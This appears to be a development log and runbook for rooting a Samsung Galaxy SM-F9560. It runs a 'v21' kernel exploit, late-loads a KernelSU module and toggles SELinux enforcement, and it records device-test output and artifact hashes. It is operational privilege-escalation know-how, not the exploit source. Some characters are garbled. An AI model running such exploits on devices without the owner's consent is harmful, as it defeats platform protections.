1. Re-run the v21 exploit on a fresh boot to re-establish the root daemon.
2. Stage `kernelsu/ksud-q6q-F9560ZCU3DZDP-kdp` as
   `/data/local/tmp/.ksud-stage` and run `./f9560-v21-root --late-load`
   (the daemon''s KernelSU late-load path: private mount namespace, bind
   mounts, execs the staged loader, restores Enforcing afterwards).
3. Verify: `/proc/modules | grep kernelsu` shows the live module, and the
   KernelSU Manager app reports `Working <LKM> [Jailbreak mode]` version
   32525. A reboot clears everything (volatile LKM installation).
4. Root My Galaxy app integration (support/targets-v3.json registration +
   artifacts release) remains after the late-load is device-verified.

### KernelSU device verification: Working LKM (q6q complete)

The first late-load attempt (module without
`CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT`) hung the kernel right after the
syscall-table live patch (`patch syscall 42, ...`), reset by the TZ
non-secure watchdog (TZBSP_ERR_FATAL_NON_SECURE_WDT, warm reset, no Oops).
The `module_layout` version warning and the BTF-mismatch warning seen in
that dump are by design for the manual-relocation build (empty
`__versions`, kallsyms-resolved symbols) and did not block the load 鈥?the
module init completed fully (KDP/DEFEX paths enabled).

Rebuilt with `CONFIG_KSU_SAMSUNG_NO_PATCH_TEXT=y` (the E1S/A56/E2S
fail-closed path; audit: 202 undefined symbols, 0 missing, 0 CRC
mismatches) and clean-rebuilt ksud to defeat the rust-embed compression
cache. Device-tested result:

```text
./f9560-v21-root --late-load        (silent; Enforcing restored)
/proc/modules: kernelsu ... Live ... (O)
KernelSU Manager: Working <LKM> [Jailbreak mode] (version 32525)
```

Final pair (published in kernelsu/ + support feed targets-v3.json):

```text
android14-6.1_kernelsu-q6q-F9560ZCU3DZDP-kdp.ko  398,432 bytes
  SHA-256 ACD379C917C8A2069A730CB34A8F0AEEB69CC4C9E41F36B92F6667C19888D01D
ksud-q6q-F9560ZCU3DZDP-kdp                       4,767,424 bytes
  SHA-256 10B8F12BC198C5BD5517BFD48133EAEAB8CF49D4B651AE0E78DC308F91534874
```

Operational notes carried from the remote session:

- The root daemon''s late-load bind-mount path is hardcoded to
  `/data/local/tmp/ksud-s25u-kdp` (su_daemon.c `KSU_LOADER_PATH`); stage
  the loader there (and as `.ksud-stage`) 鈥?the constant should be renamed
  in a future helper rebuild.
- The v21 exploit engagement remains stochastic (~1/8 to 1/1 per boot);
  a clean miss consumes the P0 session, so retries need a reboot. The
  remote verification also re-confirmed the runbook flow end-to-end.
- Everything stays volatile: reboot loses root and KernelSU; re-establish
  with the exploit run followed by `--late-load`.
- The support feed now lists SM-F9560 / 6.1.145 with
  `requiresFreshP0Session`; the artifacts payload is the v21 build
  (137,680 bytes).
